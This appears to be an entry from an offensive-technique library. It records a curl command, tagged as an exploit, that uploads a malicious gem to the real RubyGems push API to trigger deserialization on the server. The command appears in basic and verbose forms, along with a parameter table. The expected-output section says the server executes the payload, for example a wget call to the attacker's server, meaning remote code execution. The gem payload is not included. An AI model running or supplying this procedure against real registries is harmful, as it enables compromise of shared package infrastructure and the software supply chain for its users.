---
data: >-
  cat poc.gem | curl -H 'Content-Type: application/gzip' --data-binary @- -H
  'Authorization: █████' https://rubygems.org/api/v1/gems
tags:
  - upload
  - exploit
type: command
executor: bash
platforms:
  - Linux
id: 72f44b3d-9a4f-45cc-bf6d-fe1eddc60e07
created_at: '2025-12-14T17:23:53.936Z'
updated_at: '2025-12-14T17:23:53.936Z'
verified: false
validated: true
submitted: true
---
# curl-upload-malicious-gem

## Command

```bash
cat poc.gem | curl -H 'Content-Type: application/gzip' --data-binary @- -H 'Authorization: █████' https://rubygems.org/api/v1/gems
```

## Description

Uploads a binary gem file to the RubyGems API endpoint via curl, specifying gzip content-type and authorization, to trigger deserialization during server-side parsing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --data-binary @- | Reads binary data from stdin for request body | Yes |
| https://rubygems.org/api/v1/gems | Target endpoint for gem pushes | Yes |
| -H 'Authorization: █████' | API token for authentication | Yes |
| -H 'Content-Type: application/gzip' | MIME type for compressed gem data | Yes |
| cat poc.gem | Pipes the malicious gem file to curl | Yes |

## Examples

### Basic Usage

```bash
cat poc.gem | curl -H 'Content-Type: application/gzip' --data-binary @- -H 'Authorization: token' https://rubygems.org/api/v1/gems
```

### Advanced Usage

Add verbose output for debugging:

```bash
cat poc.gem | curl -v -H 'Content-Type: application/gzip' --data-binary @- -H 'Authorization: token' https://rubygems.org/api/v1/gems
```

## Expected Output

Server processes the gem, potentially showing errors (e.g., UTF-8 decoding issues), but executes the payload like a wget request to the attacker's server.

## Related

- [[Related Procedure: Upload-Malicious-Gem-to-Trigger-RCE]]
